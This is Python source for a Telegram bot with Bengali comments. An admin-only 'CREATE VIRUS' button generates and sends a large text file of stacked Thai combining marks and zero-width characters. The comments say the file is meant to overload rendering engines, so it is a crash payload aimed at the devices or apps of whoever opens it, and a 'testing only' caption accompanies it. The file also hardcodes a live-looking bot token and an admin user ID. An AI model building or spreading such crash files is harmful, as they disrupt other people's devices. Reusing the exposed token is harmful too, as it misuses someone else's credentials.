import logging
import sqlite3
import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ (সার্ভারে বটের গতিবিধি দেখার জন্য)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAEq_tOcW7hMLZwJvqUt_Os6V7h7JEozB0E"
ADMIN_ID = 6856009995 

# ৩. ডেটাবেস ফাংশন (পরিসংখ্যান সংরক্ষণের জন্য)
def init_db():
    conn = sqlite3.connect('m_r_developer_pro_v6.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. ফাইল তৈরির লজিক (যা সিস্টেম স্ট্রেস টেস্টে ব্যবহৃত হয়)
async def create_payload_file(status_msg):
    filename = "M_R_DEV_VIRUS_FILE.txt"
    # এমন ক্যারেক্টার যা রেন্ডারিং ইঞ্জিনকে ওভারলোড করে
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 40
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 30
    chunk = (crash_pattern + invisible_mass) * 500
    
    try:
        await status_msg.edit_text("⏳ ডাটাবেস থেকে পেলোড জেনারেট হচ্ছে (৩০%)...")
        with open(filename, "w", encoding="utf-8") as f:
            for i in range(1, 1001):
                f.write(chunk)
                if i == 500:
                    await status_msg.edit_text("⏳ ফাইল রাইট করা হচ্ছে (৭০%)...")
        
        await status_msg.edit_text("✅ ফাইল জেনারেশন সম্পন্ন! এখন পাঠানো হচ্ছে...")
        return filename
    except Exception as e:
        logger.error(f"Error creating file: {e}")
        return None

# ৫. মেইন মেসেজ হ্যান্ডলার (সব কমান্ড এবং বাটন এখানে প্রসেস হবে)
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # অ্যাডমিন ভেরিফিকেশন (নিরাপত্তার জন্য)
    if user_id != ADMIN_ID:
        return

    text = update.message.text

    # /start কমান্ড অথবা ড্যাশবোর্ড লোড
    if text == "/start":
        keyboard = [
            [KeyboardButton("🚀 CREATE VIRUS")],
            [KeyboardButton("📊 STATUS")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, persistent=True)
        await update.message.reply_text(
            f"🔥 **M R DEVELOPER ADVANCED PANEL** 🔥\n\nস্বাগতম বস! ড্যাশবোর্ড আপনার কিবোর্ডের উপরে সচল করা হয়েছে।",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    # ভাইরাস ফাইল তৈরির বাটন
    elif text == "🚀 CREATE VIRUS":
        status_msg = await update.message.reply_text("🚀 প্রসেস শুরু হয়েছে, দয়া করে অপেক্ষা করুন...")
        
        # ব্যাকগ্রাউন্ডে ফাইল তৈরি
        file_path = await create_payload_file(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc,
                        caption=(
                            "🔥 **VIRUS FILE GENERATED** 🔥\n\n"
                            "✅ ফাইলটি সফলভাবে তৈরি হয়েছে।\n"
                            "⚠️ **সতর্কতা:** এটি শুধুমাত্র পরীক্ষার উদ্দেশ্যে ব্যবহার করুন।"
                        ),
                        parse_mode='Markdown'
                    )
                
                # স্ট্যাটাস আপডেট
                conn = sqlite3.connect('m_r_developer_pro_v6.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
                
            except Exception as e:
                await update.message.reply_text(f"❌ ফাইল পাঠাতে ত্রুটি: {str(e)}")
            finally:
                if os.path.exists(file_path):
                    os.remove(file_path) # সার্ভার ক্লিনআপ
        else:
            await update.message.reply_text("❌ ফাইল তৈরি করা সম্ভব হয়নি।")
        
        await status_msg.delete()

    # স্ট্যাটাস চেক করার বাটন
    elif text == "📊 STATUS":
        conn = sqlite3.connect('m_r_developer_pro_v6.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 **স্ট্যাটাস রিপোর্ট**\n\nআজ পর্যন্ত মোট ভাইরাস ফাইল তৈরি হয়েছে: {total} টি।")

# ৬. রানার ফাংশন
def main():
    init_db()
    # Conflict এড়াতে drop_pending_updates=True রাখা হয়েছে
    application = Application.builder().token(TOKEN).build()
    
    # একটি মেসেজ হ্যান্ডলার দিয়ে সব প্রসেস করা হচ্ছে (দ্রুত রেসপন্সের জন্য)
    application.add_handler(MessageHandler(filters.TEXT, handle_message))
    
    print("M R DEVELOPER Bot is Live & Operational...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
        
